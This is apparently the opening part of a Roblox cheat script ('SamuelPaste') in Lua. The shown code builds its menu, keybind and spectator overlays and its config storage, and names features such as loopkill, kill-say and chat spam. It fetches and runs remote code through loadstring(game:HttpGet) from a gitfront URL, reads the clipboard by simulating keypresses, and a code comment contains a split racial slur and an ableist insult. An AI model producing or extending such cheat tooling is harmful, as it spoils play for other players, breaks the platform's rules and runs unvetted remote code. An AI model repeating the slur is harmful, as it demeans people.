-----------------------------------------------------------------------------------
-----------------------------------------------------------------------------------
-----------------------------------------------------------------------------------

--[[
method i want to use for keybinds incase i forget
table[keybind1] = should be bigggest keybind, value should be table[keybind1] - table[keybind2]
table[keybind2] = should be less bigger
tbh i forget the method i wanted to use first so yeah
--]]

if game.CoreGui:FindFirstChild("electric boogalo") then return error('script is already executed or you executed another script')end
getgenv().PasteDisabled = false
local wait = task.wait -- small test
values = {} --blahwrlqwrqwr
local library = {tabs = {}}
local Signal = loadstring(game:HttpGet("https://gitfront.io/r/Samuel/Gw6t8rBAGPhN/My-scripts/raw/backup_signal.lua"))()
--local Api = loadstring(game:HttpGet("https://pastebin.com/raw/5L3wV43u"))() 
--local ConfigSave = Signal.new("ConfigSave") 
local ConfigLoad = Signal.new("ConfigLoad")
local ConfigLoad1 = Signal.new("ConfigLoad1")
--ConfigSave1 = Signal.new("ConfigSave") 
ConfigUpdateCfgList = Signal.new('ConfigUpdateCfgList')
ConfigUpdateCfgList2 = Signal.new('ConfigUpdateCfgList2')
--VisualizeSilentAngles = Signal.new('VisualizeSilentAngles')
hitlogs = Signal.new('hitlogs')
--MenuAccent = Signal.new('MenuAccent')
function insertwithoutdupes(tab, thethingyouneedtoinsert) -- my own code :sunglasses:
	if not table.find(tab, thethingyouneedtoinsert) then
		table.insert(tab, thethingyouneedtoinsert)
	end
end	
function removewithoutdupes(tab, thethingyouneedtoremove) -- my own code :sunglasses:
	if table.find(tab, thethingyouneedtoremove) then
		table.remove(tab, table.find(tab, thethingyouneedtoremove))
	end
end	

function GetTextBounds(Text, Font, Size)
    return game:GetService('TextService'):GetTextSize(Text, Size, Font, (game.CoreGui:FindFirstChildWhichIsA('ScreenGui').AbsoluteSize)).X;
end;

--cache real
local C = {
['Vec2'] = Vector2.new,
['Vec3'] = Vector3.new,
['CF'] = CFrame.new,
['INST'] = Instance.new,
['COL3'] = Color3.new, 

['COL3RGB'] = Color3.fromRGB, 
['COL3HSV'] = Color3.fromHSV, 

['CLAMP'] = math.clamp, 

['DEG'] = math.deg, 
['FLOOR'] = math.floor, 
['ACOS'] = math.acos, 

['RANDOM'] = math.random, 
['ATAN2'] = math.atan2, 

['HUGE'] = math.huge, 
['RAD'] = math.rad,

['MIN'] = math.min,
['POW'] = math.pow,

['UDIM2'] = UDim2.new, 
['CFAngles'] = CFrame.Angles, 

['FIND'] = string.find, 
['LEN'] = string.len, 
['SUB'] = string.sub, 
['GSUB'] = string.gsub, 
['RAY'] = Ray.new,

['INSERT'] = table.insert, 
['TBLFIND'] = table.find, 
['TBLREMOVE'] = table.remove, 
['TBLSORT'] = table.sort 
}

local makeDraggable = function(frame)
				dragging = false 
					local a = frame
					local dragInput 
					local dragStart 
					local startPos 
					local function update(input) 
						local delta = input.Position - dragStart 
						a.Position = C.UDIM2(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) 
					end 
					a.InputBegan:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
							dragging = true 
							dragStart = input.Position 
							startPos = a.Position 

							input.Changed:Connect(function() 
								if input.UserInputState == Enum.UserInputState.End then 
									dragging = false 
								end 
							end) 
						end 
					end) 
					a.InputChanged:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then 
							dragInput = input 
						end 
					end) 
					game:GetService('UserInputService').InputChanged:Connect(function(input) 
						if input == dragInput and dragging then 
							update(input) 
						end 
					end)
end


getclipboard = function()
repeat wait() until iswindowactive()
   local ScreenGui = C.INST("ScreenGui")
   ScreenGui.Name = tostring(C.RANDOM(10000,999999))
   ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
   ScreenGui.Parent = game.CoreGui
   
   local clipboard = C.INST("TextBox")
   clipboard.Name = "clipboard"
   clipboard.AnchorPoint = C.Vec2(0.5, 0.5)
   clipboard.Size = C.UDIM2(0, 200, 0, 50)
   clipboard.BackgroundTransparency = 1
   clipboard.Position = C.UDIM2(0.5, 0, 0.5, 0)
   clipboard.Text = ""
   clipboard.TextTransparency = 1
   
   clipboard.Parent = ScreenGui
   clipboard:CaptureFocus()
   keypress(0x11)
   keypress(0x56)
wait()
   keyrelease(0x56)
   keyrelease(0x11)
       local value = clipboard.Text
       ScreenGui:Destroy()
       return value
   end
local function GetTeam(plr)
	return game.Teams[plr.Team.Name]
end   


local bordercolorlist = {}

function toInteger(color)
	return C.FLOOR(color.r*255)*256^2+C.FLOOR(color.g*255)*256+C.FLOOR(color.b*255)
end

function toHex(color)
	local int = toInteger(color)
	
	local current = int
	local final = ""
	
	local hexChar = {
		"A", "B", "C", "D", "E", "F"
	}
	
	repeat local remainder = current % 16
		local char = tostring(remainder)
		
		if remainder >= 10 then
			char = hexChar[1 + remainder - 10]
		end
		
		current = C.FLOOR(current/16)
		final = final..char
	until current <= 0
	
	return "#"..string.reverse(final)
end

function findtextrandom(text)
    if text:find(' @r ') then 
        local b = text:split(' @r ')
        return b[C.RANDOM(#b)]
    else 
        return text
    end
end

--[[ some guide for me because i'm retard in string
string.split(text, from-to letter) example string.split('nig.ger, '.') will return table nig and ger
C.GSUB(text, change what, change to what)
string.find(text, what to find)




--]]

function textboxtriggers(text)
	local triggers = {
		['@user'] = game.Players.LocalPlayer.Name,
		['@ping'] = string.split(game.Stats.PerformanceStats.Ping:GetValue(), '.')[1],
		['@time'] = os.date('%H:%M:%S'),
	}

	if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild('Humanoid') then 
		triggers['@health'] = game.Players.LocalPlayer.Character.Humanoid.Health
	end

	for a,b in next, triggers do 
		text = C.GSUB(text, a, b)
	end

	return findtextrandom(text)
end

local txt = game:GetService("TextService") 
function library:Tween(...) game:GetService("TweenService"):Create(...):Play() end 
--local cfglocation = "pastedstormy/pastedstormycfgs/"
 
--makefolder("pastedstormy") 
--makefolder("pastedstormy/pastedstormycfgs/")
 
local cfglocation = "SamuelPaste/cfgs/"
makefolder('SamuelPaste')
makefolder('SamuelPaste/cfgs')


if not isfile('SamuelPaste/customkillsay.txt') then
	writefile('SamuelPaste/customkillsay.txt', "message1\
message2\
message3"
)
end

if not isfile('SamuelPaste/customchatspam.txt') then
	writefile('SamuelPaste/customchatspam.txt', "message1\
message2\
message3"
)
end

Players = game:GetService("Players") 
LocalPlayer = Players.LocalPlayer 


MainUIColor = Color3.fromRGB(255,20,147)


planting = false
defusing = false
-- i see those pastes lying around\

loopkillplr = {}


for _,v in pairs(game.Players:GetPlayers()) do 
	C.INSERT(loopkillplr, v.Name)
end

	if #loopkillplr == 0 then
		C.INSERT(loopkillplr, 'none')
	end

																																																																												-- Bad 9672 & WetIDreamz 0001 & zeox 9999												
emojis = {
	[":clown:"] = utf8.char(129313);
	[":cold_face:"] = utf8.char(129398);
	[":neutral:"] = utf8.char(128528);
	[":sob:"] = utf8.char(128557);
}
local allcfgs = {} 

for _,cfg in pairs(listfiles('SamuelPaste/cfgs')) do 
	local cfgname = C.GSUB(cfg, 'SamuelPaste/cfgs\\', "") 
	C.INSERT(allcfgs, cfgname) 
end
--[[if #allcfgs == 0 then
C.INSERT(allcfgs, 'shit so script wont crash')
end--]]

function tbltorgb(tbl) 
	return C.COL3(tbl.R, tbl.G, tbl.B) 
end 
local function deepCopy(original) 
	local copy = {} 
	for k, v in pairs(original) do 
		if type(v) == "table" then 
			v = deepCopy(v) 
		end 
		copy[k] = v 
	end 
	return copy 
end 
function library:ConfigFix(cfg) 
	local copy = game:GetService("HttpService"):JSONDecode(readfile(cfglocation..cfg..".txt")) 
	for i,Tabs in pairs(copy) do 
		for i,Sectors in pairs(Tabs) do 
			for i,Elements in pairs(Sectors) do 
				if Elements.Color ~= nil then 
					local a = Elements.Color 
					Elements.Color = tbltorgb(a) 
				end 
			end 
		end 
	end 
	return copy 
end 

function library:ConfigFix1(cfg) 
	local copy = game:GetService("HttpService"):JSONDecode(readfile(cfglocation..cfg.."")) 
	for i,Tabs in pairs(copy) do 
		for i,Sectors in pairs(Tabs) do 
			for i,Elements in pairs(Sectors) do 
				if Elements.Color ~= nil then 
					local a = Elements.Color 
					Elements.Color = tbltorgb(a) 
				end 
			end 
		end 
	end 
	return copy 
end 

function library:SaveConfig(cfg) 
	local copy = deepCopy(values) 
	for i,Tabs in pairs(copy) do 
		for i,Sectors in pairs(Tabs) do 
			for i,Elements in pairs(Sectors) do 
				if Elements.Color ~= nil then 
					Elements.Color = {R=Elements.Color.R, G=Elements.Color.G, B=Elements.Color.B} 
				end 
			end 
		end 
	end 
	writefile(cfglocation..cfg..".txt", game:GetService("HttpService"):JSONEncode(copy)) 
end 

function library:SaveConfig1(cfg) 
	local copy = deepCopy(values) 
	for i,Tabs in pairs(copy) do 
		for i,Sectors in pairs(Tabs) do 
			for i,Elements in pairs(Sectors) do 
				if Elements.Color ~= nil then 
					Elements.Color = {R=Elements.Color.R, G=Elements.Color.G, B=Elements.Color.B} 
				end 
			end 
		end 
	end 
	writefile(cfglocation..cfg.."", game:GetService("HttpService"):JSONEncode(copy)) 
end 
local ovascreengui = nil
local ovascreengui = nil
			function library:New(name) 
				local menu = {} 
				local Lunar = C.INST("ScreenGui") 
				local Menu = C.INST("ImageLabel")
				local TextLabel = C.INST("TextLabel") 
				local TabButtons = C.INST("Frame") 
				local UIListLayout = C.INST("UIListLayout") 
				local Tabs = C.INST("Frame") 
				--local ImageLabel = C.INST('ImageLabel')

				Lunar.Name = "electric boogalo" 
				Lunar.ResetOnSpawn = false 
				Lunar.ZIndexBehavior = "Global" 
				Lunar.DisplayOrder = 420133769 

				local UIScale = C.INST("UIScale") 
				UIScale.Parent = Lunar 

				function menu:SetScale(scale) 
					UIScale.Scale = scale 
				end 



				local but = C.INST("TextButton") 
				but.Modal = true 
				but.Text = "" 
				but.BackgroundTransparency = 1 
				but.Parent = Lunar 

				local cursor = C.INST("ImageLabel") 
				cursor.Name = "cursor" 
				cursor.Parent = Lunar 
				cursor.BackgroundTransparency = 1 
				cursor.Size = C.UDIM2(0,17,0,17) 
				cursor.Image = "rbxassetid://518398610" 
				cursor.ZIndex = 1000 
				cursor.ImageColor3 = C.COL3RGB(255,255,255) 
				
				
				local Mouse = LocalPlayer:GetMouse() 

				game:GetService('RunService').RenderStepped:connect(function() 
					cursor.Visible = Lunar.Enabled 
					cursor.Position = C.UDIM2(0,Mouse.X-3,0,Mouse.Y+1) 
				end) 

				Menu.Name = "Menu"
				Menu.Parent = Lunar
				Menu.BackgroundColor3 = C.COL3RGB(255, 255, 255)
				Menu.BorderColor3 = C.COL3RGB(0, 0, 0)
				Menu.Position = C.UDIM2(0.5, -300, 0.5, -300)
				Menu.Size = C.UDIM2(0, 600, 0, 610)
				Menu.Image = "rbxassetid://8893436115"
				Menu.ImageColor3 = C.COL3RGB(180, 180, 180)
				
				--[[ImageLabel.Parent = Lunar
				ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255)
				ImageLabel.BorderColor3 = C.COL3RGB(0, 0, 0)
				ImageLabel.Position = C.UDIM2(0.5, -300, 0.5, -300)
				ImageLabel.Size = C.UDIM2(0, 600, 0, 610)
				ImageLabel.Image = "rbxassetid://8893436115"--]]

				library.uiopen = true 
	ovascreengui = { 
		['ova'] = Lunar,
		['menu'] = Menu,
		['cursor'] = cursor,
	} 
			
			local SpectatorsList = C.INST("ScreenGui")
do
			local Spectators = C.INST("Frame")
			local Container = C.INST("Frame")
			local UIPadding = C.INST("UIPadding")
			local Text = C.INST("TextLabel")
			local Players = C.INST("TextLabel")
			local Background = C.INST("Frame")
			local UIGradient = C.INST("UIGradient")
			local Color = C.INST("Frame")
			local UIGradient_2 = C.INST("UIGradient")

			SpectatorsList.Parent = game.CoreGui
			SpectatorsList.Name = "SpectatorsList"
			SpectatorsList.Enabled = false

			Spectators.Name = "Spectators"
			Spectators.Parent = SpectatorsList
			Spectators.BackgroundColor3 = C.COL3RGB(23, 23, 23)
			Spectators.BackgroundTransparency = 1.000
			Spectators.BorderColor3 = C.COL3RGB(20, 20, 20)
			Spectators.Position = C.UDIM2(0.00800000038, 0, 0.400000006, 49)
			Spectators.Size = C.UDIM2(0, 200, 0, 20)

			Container.Name = "Container"
			Container.Parent = Spectators
			Container.BackgroundTransparency = 1.000
			Container.BorderSizePixel = 0
			Container.Position = C.UDIM2(0, 0, 0, 4)
			Container.Size = C.UDIM2(1, 0, 0, 14)
			Container.ZIndex = 3

			UIPadding.Parent = Container
			UIPadding.PaddingLeft = UDim.new(0, 4)

			Text.Name = "Text"
			Text.Parent = Container
			Text.BackgroundTransparency = 1.000
			Text.Size = C.UDIM2(1, 0, 1, 0)
			Text.ZIndex = 4
			Text.Font = Enum.Font.Code
			Text.Text = "spectators"
			Text.TextColor3 = C.COL3RGB(65025, 65025, 65025)
			Text.TextSize = 13.000
			Text.TextStrokeTransparency = 0.000

			Players.Name = "Players"
			Players.Parent = Container
			Players.BackgroundTransparency = 1.000
			Players.Position = C.UDIM2(0.0196080022, 0, 1.44285719, 0)
			Players.Size = C.UDIM2(0.980391979, 0, 1.14285719, 0)
			Players.ZIndex = 4
			Players.Font = Enum.Font.Code
			Players.Text = "loading"
			Players.TextColor3 = C.COL3RGB(65025, 65025, 65025)
			Players.TextSize = 12.000
			Players.TextStrokeTransparency = 0.000
			Players.TextYAlignment = Enum.TextYAlignment.Top

			Background.Name = "Background"
			Background.Parent = Spectators
			Background.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			Background.BorderColor3 = C.COL3RGB(20, 20, 20)
			Background.Size = C.UDIM2(1, 0, 1, 0)

			UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(22, 22, 22)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(22, 22, 22))}
			UIGradient.Rotation = 90
			UIGradient.Parent = Background

			Color.Name = "Color"
			Color.Parent = Spectators
			Color.BackgroundColor3 = MainUIColor
			Color.BorderSizePixel = 0
			Color.Size = C.UDIM2(1, 0, 0, 2)
			Color.ZIndex = 2

			--[[UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, C.COL3RGB(255,20,147)), ColorSequenceKeypoint.new(1, MainUIColor)}
			UIGradient_2.Rotation = 90
			UIGradient_2.Parent = Color--]]

			function GetSpectators()
				local CurrentSpectators = ""
				for i,v in pairs(game.Players:GetChildren()) do 
					pcall(function()
						if v ~= game.Players.LocalPlayer then
							if not v.Character then 
								if (v.CameraCF.Value.p - game.Workspace.CurrentCamera.CFrame.p).Magnitude < 10 then 
									if CurrentSpectators == "" then
											CurrentSpectators = v.Name
										else
											CurrentSpectators = CurrentSpectators.. "\n" ..v.Name
										end
									end
								end
							end
						end)
					end
				return CurrentSpectators
			end

			spawn(function()
				while wait(0.1) do
					if SpectatorsList.Enabled then
						Players.Text = GetSpectators()
					end
				end
			end)
		
			local function SCUAM_fake_script() -- Spectators.LocalScript 
				local script = C.INST('LocalScript', Spectators)
				local gui = script.Parent
				gui.Draggable = true
				gui.Active = true
			end
			coroutine.wrap(SCUAM_fake_script)()
			end
				function library:SetSpectatorVisible(rit)
					SpectatorsList.Enabled = rit
				end		

	--[[local KeybindList = C.INST("ScreenGui") 
	do 
		local TextLabel = C.INST("TextLabel") 
		local Frame = C.INST("Frame") 
		local UIListLayout = C.INST("UIListLayout") 

		KeybindList.Name = "KeybindList" 
		KeybindList.ZIndexBehavior = Enum.ZIndexBehavior.Global 
		KeybindList.Enabled = false 

		TextLabel.Parent = KeybindList 
		TextLabel.BackgroundColor3 = C.COL3RGB(0, 0, 0) 
		TextLabel.BorderColor3 = MainUIColor
		TextLabel.Position = C.UDIM2(0, 1, 0.300000012, 0) 
		TextLabel.Size = C.UDIM2(0, 155, 0, 24) 
		TextLabel.ZIndex = 2 
		TextLabel.Font = Enum.Font.SourceSansSemibold 
		TextLabel.Text = "keybinds" 
		TextLabel.TextColor3 = C.COL3RGB(255, 255, 255) 
		TextLabel.TextSize = 14.000 

		Frame.Parent = TextLabel 
		Frame.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
		Frame.BackgroundTransparency = 1.000 
		Frame.Position = C.UDIM2(0, 0, 1, 1) 
		Frame.Size = C.UDIM2(1, 0, 1, 0) 

		UIListLayout.Parent = Frame 
		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

		KeybindList.Parent = game.CoreGui 
	end--]]

		local KeybindList = Instance.new("ScreenGui")
		do
		local Grad = Instance.new("Frame")
		local Frame = Instance.new("Frame")
		local Frame_2 = C.INST('Frame')
		local UIGradient = Instance.new("UIGradient")
		local TextLabel = Instance.new("TextLabel")
		local Keybinds = Instance.new("TextLabel")
		local UIListLayout = C.INST('UIListLayout')

		--Properties:

		KeybindList.Parent = game.CoreGui
		KeybindList.Enabled = false
		KeybindList.Name = 'KeybindList'

		Frame.Parent = KeybindList
		Frame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
		Frame.Position = UDim2.new(0, 0, 0.366762191, 0)
		Frame.Size = UDim2.new(0, 60, 0, 20)
		Frame.ZIndex = 694201337

		Grad.Name = "Grad"
		Grad.Parent = Frame
		Grad.BackgroundColor3 = MainUIColor
		Grad.BorderSizePixel = 0
		Grad.Position = UDim2.new(0, 1, 0, -1)
		Grad.Size = UDim2.new(0, 60, 0, 2)
		Grad.ZIndex = 694201337

		UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(11, 11, 11)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
		UIGradient.Rotation = 90
		UIGradient.Parent = Frame

		Keybinds.Name = "Keybinds"
		Keybinds.Parent = Frame
		Keybinds.Active = true
		Keybinds.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Keybinds.BackgroundTransparency = 1.000
		Keybinds.LayoutOrder = 1
		Keybinds.Position = UDim2.new(0, 0, 0, 0)
		Keybinds.Size = UDim2.new(0, 60, 0, 20)
		Keybinds.ZIndex = 694201337
		Keybinds.Font = Enum.Font.SourceSans
		Keybinds.LineHeight = 1.190
		Keybinds.Text = "Keybinds"
		Keybinds.TextColor3 = Color3.fromRGB(255, 255, 255)
		Keybinds.TextSize = 14.000
		Keybinds.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
		
		Frame_2.Parent = Frame
		Frame_2.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
		Frame_2.Position = UDim2.new(0, 0, 1, 0)
		Frame_2.Size = UDim2.new(0, 60, 0, 28)
		Frame_2.Visible = false
		
		UIListLayout.Parent = Frame_2 
		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
		UIListLayout.SortOrder = Enum.SortOrder.Name
		--[[TextLabel.Parent = Frame
		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.Position = UDim2.new(0, 0, 0.926934123, 0)
		TextLabel.Size = UDim2.new(0, 183, 0, 20)
		TextLabel.Font = Enum.Font.SourceSans
		TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
		TextLabel.TextSize = 14.000
		TextLabel.TextXAlignment = Enum.TextXAlignment.Left--]]
		makeDraggable(Frame)
		end
		
		local keybindss = {}
		local biggestkeybind
		
	function keybindadd(text,keybind) 
	if KeybindList.Frame.Frame:FindFirstChild(text) then 
		KeybindList.Frame.Frame:FindFirstChild(text):Destroy(); 
		KeybindList.Frame.Frame.Size = KeybindList.Frame.Frame.Size - C.UDIM2(0,0,0,10); 
	end
		if not KeybindList.Frame.Frame:FindFirstChild(text) then 
			local TextLabel = C.INST("TextLabel")
			--local size = GetTextBounds(''..text..''..keybind..'', Enum.Font.Code, 14)
			--[[if size >= (KeybindList.Frame.Size.X - 8) then
			KeybindList.Frame.Size = C.UDIM2(0, Size + 8, 0, 20)
			KeybindList.Frame.Grad.Size = C.UDIM2(0,KeybindList.Frame.Size.X, 0,4)
			KeybindList.Frame.Frame.Size = C.UDIM2(0, Size + 8, 0, 20 * #keybindss)
			end--]]
			--[[TextLabel.BackgroundColor3 = C.COL3RGB(1, 1, 1) 
			TextLabel.BorderColor3 = C.COL3RGB(255,20,147) 
			TextLabel.
			TextLabel.BorderSizePixel = 0 
			TextLabel.Size = C.UDIM2(0, 170, 0, 20) 
			TextLabel.ZIndex = 2 
			TextLabel.Font = Enum.Font.SourceSansSemibold 
			TextLabel.Text = ""..text.." : Enabled"
			TextLabel.TextColor3 = C.COL3RGB(255, 255, 255) 
			TextLabel.TextSize = 14.000 
			TextLabel.Name = text 
			TextLabel.Parent = KeybindList.TextLabel.Frame --]]
			local Size = GetTextBounds("["..keybind..'] '..text..'', Enum.Font.SourceSans, 14)
			local XOriginalSize = KeybindList.Frame.Frame.Size.X.Offset
			local XScale = Size
			
			if XScale >= XOriginalSize then
				KeybindList.Frame.Frame.Size = KeybindList.Frame.Frame.Size + C.UDIM2(0, Size,0,10)
				KeybindList.Frame.Size = KeybindList.Frame.Size + C.UDIM2(0, Size, 0, 0)
				KeybindList.Frame.Grad.Size = KeybindList.Frame.Grad.Size + C.UDIM2(0, Size, 0 ,0)
			else
				KeybindList.Frame.Frame.Size = KeybindList.Frame.Frame.Size + C.UDIM2(0,0,0,10)
			end
				if KeybindList.Frame.Frame.Size == C.UDIM2(0,60,0,28) then
					KeybindList.Frame.Frame.Visible = false
					KeybindList.Frame.Size = C.UDIM2(0,60,0,20)
					KeybindList.Frame.Grad.Size = C.UDIM2(0,60,0, 2)
				else
					KeybindList.Frame.Frame.Visible = true
				end
			TextLabel.Name = text
			TextLabel.Parent = KeybindList.Frame.Frame
			TextLabel.Active = true
			TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.LayoutOrder = 1
			TextLabel.Position = UDim2.new(0,10,0,0)
			TextLabel.Size = UDim2.new(0, 60, 0, 20)
			TextLabel.ZIndex = 694201337
			TextLabel.Font = Enum.Font.SourceSans
			TextLabel.LineHeight = 1.190
			TextLabel.Text = "["..keybind..'] '..text..''
			TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
		end 
	end 
		
	function keybindtoggle(text) 
		KeybindList.Frame.Frame:FindFirstChild(text).Text = KeybindList.Frame.Frame:FindFirstChild(text).Text..' : Enabled'
	end 
					function keybindhold(text)
						KeybindList.Frame.Frame:FindFirstChild(text).Text = KeybindList.Frame.Frame:FindFirstChild(text).Text..' : Held'
					end

	function keybindremove(text, keybind) 
		if KeybindList.Frame.Frame:FindFirstChild(text) and KeybindList.Frame.Frame:FindFirstChild(text).Text then

			KeybindList.Frame.Frame:FindFirstChild(text):Destroy()
			KeybindList.Frame.Frame.Size = KeybindList.Frame.Frame.Size - C.UDIM2(0,0,0,10)
					if not KeybindList.Frame.Frame:FindFirstChild(text) then 
			local TextLabel = C.INST("TextLabel")
			--local size = GetTextBounds(''..text..''..keybind..'', Enum.Font.Code, 14)
			--[[if size >= (KeybindList.Frame.Size.X - 8) then
			KeybindList.Frame.Size = C.UDIM2(0, Size + 8, 0, 20)
			KeybindList.Frame.Grad.Size = C.UDIM2(0,KeybindList.Frame.Size.X, 0,4)
			KeybindList.Frame.Frame.Size = C.UDIM2(0, Size + 8, 0, 20 * #keybindss)
			end--]]
			--[[TextLabel.BackgroundColor3 = C.COL3RGB(1, 1, 1) 
			TextLabel.BorderColor3 = C.COL3RGB(255,20,147) 
			TextLabel.
			TextLabel.BorderSizePixel = 0 
			TextLabel.Size = C.UDIM2(0, 170, 0, 20) 
			TextLabel.ZIndex = 2 
			TextLabel.Font = Enum.Font.SourceSansSemibold 
			TextLabel.Text = ""..text.." : Enabled"
			TextLabel.TextColor3 = C.COL3RGB(255, 255, 255) 
			TextLabel.TextSize = 14.000 
			TextLabel.Name = text 
			TextLabel.Parent = KeybindList.TextLabel.Frame --]]
			local Size = GetTextBounds("["..keybind..'] '..text..'', Enum.Font.SourceSans, 14)
			local XOriginalSize = KeybindList.Frame.Frame.Size.X.Offset
			local XScale = Size
			
			if XScale >= XOriginalSize then
				KeybindList.Frame.Frame.Size = KeybindList.Frame.Frame.Size + C.UDIM2(0, Size,0,10)
			else
				KeybindList.Frame.Frame.Size = KeybindList.Frame.Frame.Size + C.UDIM2(0,0,0,10)
			end
				if KeybindList.Frame.Frame.Size == C.UDIM2(0,60,0,28) then
					KeybindList.Frame.Frame.Visible = false
					KeybindList.Frame.Size = C.UDIM2(0,60,0,20)
					KeybindList.Frame.Grad.Size = C.UDIM2(0,60,0, 2)
				else
					KeybindList.Frame.Frame.Visible = true
				end
			TextLabel.Name = text
			TextLabel.Parent = KeybindList.Frame.Frame
			TextLabel.Active = true
			TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.LayoutOrder = 1
			TextLabel.Position = UDim2.new(0,10,0,0)
			TextLabel.Size = UDim2.new(0, 60, 0, 20)
			TextLabel.ZIndex = 694201337
			TextLabel.Font = Enum.Font.SourceSans
			TextLabel.LineHeight = 1.190
			TextLabel.Text = "["..keybind..'] '..text..''
			TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
		end 
				if KeybindList.Frame.Frame.Size == C.UDIM2(0,60,0,28) then
					KeybindList.Frame.Frame.Visible = false
					KeybindList.Frame.Size = C.UDIM2(0,60,0,20)
					KeybindList.Frame.Grad.Size = C.UDIM2(0,60,0, 2)
				else
					KeybindList.Frame.Frame.Visible = true
				end
		end
	end 

	function keybindremove2(text) 
		if KeybindList.Frame.Frame:FindFirstChild(text) then
				
				KeybindList.Frame.Frame.Size = KeybindList.Frame.Frame.Size - C.UDIM2(0,0,0,10)
				local XOffset = KeybindList.Frame.Frame.Size.X.Offset
				if XOffset <= 60 then
					--KeybindList.Frame.Frame.Size.X.Offset = 60
					KeybindList.Frame.Frame.Size = C.UDIM2(KeybindList.Frame.Frame.Size.X.Scale, 60, KeybindList.Frame.Frame.Size.Y.Scale, KeybindList.Frame.Frame.Size.Y.Offset)
				end
				if KeybindList.Frame.Frame.Size.Y.Offset == 28 then
					--KeybindList.Frame.Frame.Size.X.Offset = 60
					KeybindList.Frame.Frame.Size = C.UDIM2(KeybindList.Frame.Frame.Size.X.Scale, 60, KeybindList.Frame.Frame.Size.Y.Scale, KeybindList.Frame.Frame.Size.Y.Offset)
				end
				if KeybindList.Frame.Frame.Size == C.UDIM2(0,60,0,28) then
					KeybindList.Frame.Frame.Visible = false
					KeybindList.Frame.Size = C.UDIM2(0,60,0,20)
					KeybindList.Frame.Grad.Size = C.UDIM2(0,60,0, 2)
				else
					KeybindList.Frame.Frame.Visible = true
				end
			KeybindList.Frame.Frame:FindFirstChild(text):Destroy() 
		end 
	end 

	function library:SetKeybindVisible(Joe) 
		KeybindList.Enabled = Joe 
	end 
				library.dragging = false 
				do 
					local UserInputService = UserInputService
					local a = Menu 
					local dragInput 
					local dragStart 
					local startPos 
					local function update(input) 
						local delta = input.Position - dragStart 
						a.Position = C.UDIM2(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) 
					end 
					a.InputBegan:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
							library.dragging = true 
							dragStart = input.Position 
							startPos = a.Position 

							input.Changed:Connect(function() 
								if input.UserInputState == Enum.UserInputState.End then 
									library.dragging = false 
								end 
							end)
						end 
					end) 
					a.InputChanged:Connect(function(input) 
						if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then 
							dragInput = input 
						end 
					end) 
					game:GetService('UserInputService').InputChanged:Connect(function(input) 
						if input == dragInput and library.dragging then 
							update(input) 
						end 
					end) 
				end 

				local Holder = C.INST("Frame")	

				Holder.Name = "Holder"
				Holder.Parent = Menu
				Holder.BackgroundColor3 = C.COL3RGB(25, 25, 25)
				Holder.BackgroundTransparency = 0.400
				Holder.BorderColor3 = C.COL3RGB(7, 0, 0)
				Holder.Position = C.UDIM2(0, 0, 0, -26)
				Holder.Size = C.UDIM2(0, 600, 0, 25)


					TextLabel.Parent = Holder
					TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255)
					TextLabel.BackgroundTransparency = 1.000
					TextLabel.Position = C.UDIM2(0, 8, 0, 0)
					TextLabel.Size = C.UDIM2(0, 570, 0, 23)
					TextLabel.Font = Enum.Font.Ubuntu
					TextLabel.Text = "SamuelPaste"
					TextLabel.TextColor3 = C.COL3RGB(255, 255, 255)
					TextLabel.TextSize = 12.000
					TextLabel.TextStrokeTransparency = 0.000
					TextLabel.TextXAlignment = Enum.TextXAlignment.Left

				TabButtons.Name = "TabButtons"
				TabButtons.Parent = Holder
				TabButtons.BackgroundColor3 = C.COL3RGB(255, 255, 255)
				TabButtons.BackgroundTransparency = 1.000
				TabButtons.Position = C.UDIM2(0.13, 0, 0, 0)
				TabButtons.Size = C.UDIM2(0, 498, 0, 25)


				UIListLayout.Parent = TabButtons
				UIListLayout.FillDirection = Enum.FillDirection.Horizontal
				UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

				Tabs.Name = "Tabs" 
				Tabs.Parent = Menu 
				Tabs.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
				Tabs.BackgroundTransparency = 1.000 
